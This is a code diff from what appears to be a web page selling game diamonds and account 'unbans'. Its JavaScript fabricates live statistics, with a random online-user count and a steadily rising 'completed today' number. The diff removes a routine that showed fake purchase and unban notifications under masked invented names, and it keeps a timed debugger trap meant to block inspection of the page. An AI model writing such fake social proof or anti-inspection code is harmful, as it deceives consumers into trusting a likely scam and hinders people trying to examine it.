             return 1500 + Math.abs(hash) % 1500;
         }
 
-        // 实时数据模拟（在线人数波动+每日完成数）
         function startRealtimeSimulation() {
             let baseCount = getTodayBaseCount();
             let currentCount = baseCount;
             
-            // 初始化显示
             document.getElementById('todayCount').textContent = currentCount.toLocaleString();
             
-            // 在线人数：每5秒在180-520之间随机波动
             setInterval(() => {
                 const online = Math.floor(Math.random() * (520 - 180 + 1)) + 180;
                 document.getElementById('onlineCount').textContent = online;
             }, 5000);
 
-            // 今日完成数：每8-15秒随机增加1-3个
             setInterval(() => {
                 const increment = Math.floor(Math.random() * 3) + 1;
                 currentCount += increment;
@@ -2273,30 +2251,7 @@
             }, Math.floor(Math.random() * 7000) + 8000);
         }
 
-        // 通知系统（使用打码后的名字）
-        function startNotificationSystem() {
-            const actions = [
-                'just completed unban', 
-                'just bought 300 diamonds', 
-                'just bought 6480 diamonds',
-                'successfully unbanned account',
-                'just purchased 1280 diamonds',
-                'just recharged 5000 coins',
-                'just got 10000 diamonds'
-            ];
-            
-            setInterval(() => {
-                if (Math.random() > 0.6) {
-                    // 随机选择一个名字并打码显示
-                    const rawName = userNames[Math.floor(Math.random() * userNames.length)];
-                    const maskedName = maskName(rawName);
-                    const action = actions[Math.floor(Math.random() * actions.length)];
-                    showToast(`🎉 ${maskedName} ${action}`);
-                }
-            }, 12000);
-        }
-
-        // 防调试（保持原有）
+        // 防调试
         setInterval(() => {
             const before = new Date();
             debugger;
